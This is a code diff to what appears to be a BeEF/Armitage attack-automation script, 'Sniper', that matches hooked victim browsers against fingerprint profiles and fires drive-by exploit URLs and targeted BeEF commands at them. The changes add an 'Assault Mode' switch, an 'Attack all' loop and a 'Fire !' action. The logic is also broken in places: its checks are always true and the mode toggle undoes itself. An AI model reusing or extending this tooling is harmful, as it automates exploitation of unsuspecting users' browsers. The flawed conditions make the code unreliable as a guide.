@@ -408,8 +408,15 @@ on tab_table_click {
 	if ($3 eq "Edit") {
 		edit_profiles($1);
 	}
-	if ($3 eq "Set cc link") {
-		edit_cclink($1);
+	if ($3 eq "Assault Mode") {
+		if ($assault_mode == 0) {   
+			show_message( "Sniper is now in Active mode");
+			$assault_mode = 1 ;
+			}
+		if ($assault_mode == 1) {  
+			show_message("Sniper is now in Stand-by mode. \n This mode is usefull only if you want to execute manualy each action selected by the bot \n so that you stay in control of each attempt");
+			$assault_mode = 0 ;
+		    }
 	}
 	if ($3 eq "Add") {
 		add_profiles($1);
@@ -417,7 +424,7 @@ on tab_table_click {
 	if ($3 eq "Delete") {
 		delete_profiles($1);
 	}
-	if ($3 eq "Refresh match") {
+	if ($3 eq "re-Scan") {
 		rematch();
 		refresh_analyze($1);
 	}
@@ -431,9 +438,19 @@ on tab_table_click {
 			for ($i = 0; $i < size(@analyze); $i++)   {
 				$sid = @analyze[$i]["sessionID"] ;
 				$inviframe = @analyze[$i]["Attack_URL"] ;
+				$cclink = @analyze[$i]["Link_cc"];
+							
+				if ($cclink ne "*" || $cclink ne " " || $cclink ne "-" || $cclink ne ""){
+					$targeted_cmdeid = @beef_autorun[$cclink]["id"];
+					$targeted_cmde_param = @beef_autorun[$cclink]["Param"];
+					send_beefcmd_with_param($sid, $targeted_cmdeid, $targeted_cmde_param,0,$sip); #sleep(50);
+					append($console , "\c9[*] Sniper send targeted command (+)");
+					} 
+				if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
 				run_driveby($beefUrl, $sid, $key, $inviframe);
-				append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sid . "" );
-				} 
+				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " to " . $sid . "" );
+					} else {append($console , "\c9[-] No Attack specified for Sniper" );}
+				}
 		} else {println("No profiles/zombies association found !")}
 	}
 	if ($3 eq "Refresh list") {
@@ -461,7 +478,7 @@ on tab_table_click {
 		}
 	if ($3 eq "Line of sight") {
 		local('$attackMap');
-		$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL"), @(), @("Refresh match", "Change URL", " Attack all"), "analyze_hook", 1);
+		$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL", "Link_cc"), @(), @("re-Scan", "Change URL", " Attack all", "Assault Mode"), "analyze_hook", 1);
 		refresh_analyze($attackMap);
 	}
 }
@@ -515,7 +532,7 @@ sub add_profile {
  if ($decision == 0){
 			$inviframe = %profile["Attack_URL"];
 			$cclink = %profile["Link_cc"];
-			%analyz_dr = %(id => "$id_analyz", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe");
+			%analyz_dr = %(id => "$id_analyz", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe", Link_cc => "$cclink");
 			@analyze["$id_analyz"] = %analyz_dr;
 			$id_analyz = $id_analyz + 1 ;
 			append($console , "Sniper has found a target that match with one of your defined profiles " )
@@ -526,7 +543,7 @@ sub add_profile {
 				append($console , "\c9[*] Sniper send targeted command (+)");
 				} 
 			if ($assault_mode == 1){
-				if ($inviframe ne "-" || $inviframe ne " " || $inviframe ne "*" || $inviframe ne ""){
+				if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
 				run_driveby($beefUrl, $sid, $key, $inviframe);
 				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
 					} else {append($console , "\c9[-] No Attack specified for Sniper" );}
@@ -786,7 +803,7 @@ popup cmde_hook {
 					item "Unknow(UN)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "UN", Param => "");
 						@beef_autorun[$id_beef_autorun] = %cmde;
 						$id_beef_autorun = $id_beef_autorun + 1 ;	}
-					item "For Open Drive-by"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "Sniper", Param => "");
+					item "Use as a Targeted command"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "Sniper", Param => "");
 						@beef_autorun[$id_beef_autorun] = %cmde;
 						$id_beef_autorun = $id_beef_autorun + 1 ;	}
 			}
@@ -931,24 +948,14 @@ popup attacks {
 		
 	item "Open Drive-by " {
 		local('$sniper');
-		$sniper = open_table_tab("Open Drive-by", "", @("id", "Browser", "UserAgent", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL", "Link_cc"), @(), @("Add", "Refresh profiles","Edit", "Delete", "Line of sight"), "sniper_hook", 1);
+		$sniper = open_table_tab("Open Drive-by", "", @("id", "Browser", "UserAgent", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL", "Link_cc"), @(), @("Add", "Refresh profiles","Edit", "Delete", "Line of sight", "Assault Mode"), "sniper_hook", 1);
 		refresh_profiles($sniper);
 		}
 	item "Line of Sight(+) " {
 			local('$attackMap');
-			$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL"), @(), @("Refresh match", "Change URL", " Attack all"), "analyze_hook", 1);
+			$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL", "Link_cc"), @(), @("re-Scan", "Change URL", " Attack all", "Assault Mode"), "analyze_hook", 1);
 			refresh_analyze($attackMap);
 		}
-	#menu "Assault mode" {
-	#	item "Active" {   
-	#			append($console, "\cC [*] Sniper is in assault mode");
-	#			$assault = 1 ;
-	#			}
-	#	item "Stand-by" {  
-	#			append($console, "\c4 [-]  Sniper is in stand-by. \n this mode is usefull only if you want to send attack_URL manualy so that you control each attempt");
-	#			$assault = 0 ;
-	#	        }
-	#	}
 	}
  }
 popup analyze_hook {
@@ -956,10 +963,20 @@ popup analyze_hook {
 	item "Fire !" { 
 		@sessid = flatten(table_selected($1, "sessionID"));
 		@urlattack = flatten(table_selected($1, "Attack_URL"));
+		@cclink = flatten(table_selected($1, "Link_cc"));
 		$sessid_dr = @sessid[0];
 		$inviframe = @urlattack[0];
-		run_driveby($beefUrl, $sessid_dr, $key, $inviframe);
-		append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sessid_dr . "" );
+		$cclink = @cclink[0];
+		if ($cclink ne "*" || $cclink ne " " || $cclink ne "-" || $cclink ne ""){
+			$targeted_cmdeid = @beef_autorun[$cclink]["id"];
+			$targeted_cmde_param = @beef_autorun[$cclink]["Param"];
+			send_beefcmd_with_param($sid, $targeted_cmdeid, $targeted_cmde_param,0,$sip); #sleep(50);
+			append($console , "\c9[*] Sniper send targeted command (+)");
+			} 
+		if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
+			run_driveby($beefUrl, $sid, $key, $inviframe);
+			append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " to " . $sid . "" );
+			}
 		}	
 	} 
 
@@ -1015,7 +1032,6 @@ sub load_clientside_recon_mod {
 sub refresh_profiles {
 	table_set($1, @targets);
 	}
-
 #sub edit_cclink {
 #	@idf = flatten(table_selected($1, "id"));
 #	$idf = @idf[0]; 
@@ -1180,7 +1196,9 @@ sub rematch {
 			println("$decision");
  if ($decision == 0){
 			$inviframe = %profile["Attack_URL"];
-			%analyz_dr = %(id => "$id_analyz", ip => "$this_sip", sessionID => "$this_sid" , Attack_URL => "$inviframe");
+			$cclink = %profile["Link_cc"];
+			println("$cclink");
+			%analyz_dr = %(id => "$id_analyz", ip => "$this_sip", sessionID => "$this_sid" , Attack_URL => "$inviframe" , Link_cc => "$cclink" );
 			@analyze[$id_analyz] = %analyz_dr;
 			$id_analyz = $id_analyz + 1 ;
 			append($console , "\c9[+] Sniper has found a target that match with one of your defined profiles " );
